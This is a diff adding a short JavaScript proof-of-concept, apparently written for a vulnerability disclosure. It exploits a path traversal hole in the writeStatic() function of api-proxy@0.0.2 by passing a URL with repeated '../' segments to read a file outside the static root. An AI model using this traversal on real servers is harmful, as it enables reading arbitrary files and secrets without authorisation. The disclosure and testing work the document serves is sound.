@@ -1,0 +1,30 @@
+```javascript
+// Path Traversal exploit for api-proxy@0.0.2 (lib/static.js)
+// writeStatic() joins the raw request.url onto the static "www" root with
+// Path.join and never strips "../" segments, so an attacker-controlled URL
+// can escape the root and reach guessContentType()/FS.readFile() in writeFile(),
+// leaking arbitrary files on disk (here: this project's package.json).
+
+const path = require("path");
+const { writeStatic } = require("api-proxy/lib/static.js");
+
+const secretFile = path.resolve(__dirname, "package.json");
+const traversalUrl = "/" + "../".repeat(10) + secretFile.replace(/^\//, "");
+
+const fakeRequest = { url: traversalUrl };
+const fakeResponse = {
+  writeHead(statusCode, headers) {
+    console.log("[response] status:", statusCode, headers);
+  },
+  write(chunk) {
+    console.log("[LEAKED FILE CONTENTS]:\n" + chunk.toString());
+  },
+  end() {
+    console.log("[response] end");
+  }
+};
+
+writeStatic(fakeRequest, fakeResponse, function () {
+  console.log("[fallback] file not found (traversal failed)");
+});
+```
